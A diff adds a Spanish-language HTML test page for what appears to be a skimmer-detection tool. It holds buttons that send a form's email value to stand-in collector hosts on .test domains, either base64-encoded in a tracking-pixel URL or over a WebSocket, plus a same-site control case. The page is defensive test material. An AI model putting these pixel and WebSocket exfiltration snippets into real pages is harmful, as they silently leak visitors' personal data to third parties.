@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><title>Prueba: exfiltración codificada</title></head>
+<body style="font: 15px/1.5 system-ui, sans-serif; max-width: 700px; margin: 40px auto;">
+  <h1>🕳️ Prueba: exfiltración disfrazada</h1>
+  <p>Los skimmers de verdad no mandan el dato tal cual ni usan <code>fetch</code>:
+     lo pasan a base64 y lo meten en la dirección de una imagen de 1×1 (el
+     «píxel»), o lo sacan por un WebSocket. Aquí se prueban esas dos salidas.</p>
+  <p><b>Esperado:</b> cada uno de los dos primeros botones → exfiltración a un
+     tercero (+70), banner naranja. El tercero es el control: mismo dato, misma
+     técnica, pero hacia el propio sitio → no debe saltar nada.</p>
+  <p>Los destinos son dominios <code>.test</code>, que no resuelven: nada sale de tu equipo.</p>
+  <hr>
+
+  <form onsubmit="return false" style="border:1px solid #ccc; padding:16px; border-radius:8px; max-width:340px;">
+    <p><label>Email<br><input type="email" id="email" value="victima@ejemplo.com"></label></p>
+    <p><button type="button" id="pixel">Píxel con el dato en base64</button></p>
+    <p><button type="button" id="socket">WebSocket con el dato en la URL codificada</button></p>
+    <p><button type="button" id="propio">Control: píxel hacia este mismo sitio</button></p>
+  </form>
+  <p id="msg" style="color:#a85a13;"></p>
+
+  <script>
+    const email = document.getElementById("email");
+    const msg = (m) => { document.getElementById("msg").textContent = m; };
+    // Simular el tecleo y dar un instante a que el valor llegue al probe.
+    const trasTeclear = (fn) => {
+      email.dispatchEvent(new Event("input", { bubbles: true }));
+      setTimeout(fn, 400);
+    };
+
+    document.getElementById("pixel").onclick = () => trasTeclear(() => {
+      new Image().src = "http://recolector-pixel.test/p.gif?d=" + btoa(email.value);
+      msg("Píxel lanzado (falla adrede). Comprueba el banner / panel.");
+    });
+
+    document.getElementById("socket").onclick = () => trasTeclear(() => {
+      // El envío se intercepta antes de que el navegador compruebe la conexión.
+      const ws = new WebSocket("ws://recolector-socket.test/in");
+      try {
+        ws.send("u=" + encodeURIComponent(email.value));
+      } catch {
+        /* la conexión no existe: es lo esperado */
+      }
+      msg("Envío por WebSocket lanzado (falla adrede). Comprueba el banner / panel.");
+    });
+
+    document.getElementById("propio").onclick = () => trasTeclear(() => {
+      new Image().src = "/clean.html?d=" + btoa(email.value);
+      msg("Píxel hacia el propio sitio: no debe aparecer ninguna señal.");
+    });
+  </script>
+
+  <p><a href="/index.html">← Volver al índice</a></p>
+</body>
+</html>
